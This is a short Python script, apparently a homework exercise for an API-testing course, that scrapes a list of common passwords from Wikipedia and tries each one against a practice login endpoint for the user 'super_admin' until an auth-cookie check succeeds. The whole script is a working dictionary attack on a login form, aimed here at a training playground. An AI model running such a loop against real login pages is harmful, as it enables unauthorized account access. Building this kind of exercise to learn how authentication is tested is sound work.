import requests
from lxml import html

response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")

tree = html.fromstring(response.text)

locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = tree.xpath(locator)
print(passwords)
list_of_passwords = []
for password in passwords:
    list_of_passwords.append(str(password).strip())

list_of_passwords = set(list_of_passwords)
list_of_passwords = list(list_of_passwords)
print(list_of_passwords)

checker = 'You are NOT authorized'
i = 0
while checker == 'You are NOT authorized':
    payload = {'login': 'super_admin', 'password': list_of_passwords[i]}
    print(payload)
    response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data=payload)

    cookie_payload = dict(response.cookies)
    print(cookie_payload)

    cookie_response = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies=cookie_payload)
    print(cookie_response.text)
    checker = cookie_response.text
    i += 1
